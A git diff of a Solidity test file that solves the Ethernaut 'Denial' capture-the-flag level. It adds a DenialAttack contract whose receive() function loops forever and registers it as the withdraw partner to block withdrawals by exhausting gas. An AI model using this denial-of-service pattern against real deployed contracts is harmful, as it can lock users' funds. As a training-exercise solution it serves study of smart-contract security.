@@ -7,17 +7,33 @@ import {Denial} from "../src/levels/Denial.sol";
 
 contract DenialTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
-	DenialFactory factory = new DenialFactory();
-	ethernaut.registerLevel(factory);
-	levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
+        super.setUp();
+        DenialFactory factory = new DenialFactory();
+        ethernaut.registerLevel(factory);
+        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(
+            factory
+        );
     }
 
     function testSolveDenial() public {
-	Denial instance = Denial(payable(levelAddress));
+        Denial instance = Denial(payable(levelAddress));
 
-	// insert your code here!
-	
-	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+        // [START]
+
+        // 1. Deploy attacker contract
+        DenialAttack attacker = new DenialAttack();
+
+        // 2. Set partner
+		instance.setWithdrawPartner(address(attacker));
+
+        // [END]
+
+        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
+
+contract DenialAttack {
+    receive() external payable {
+        while (true) {}
     }
 }
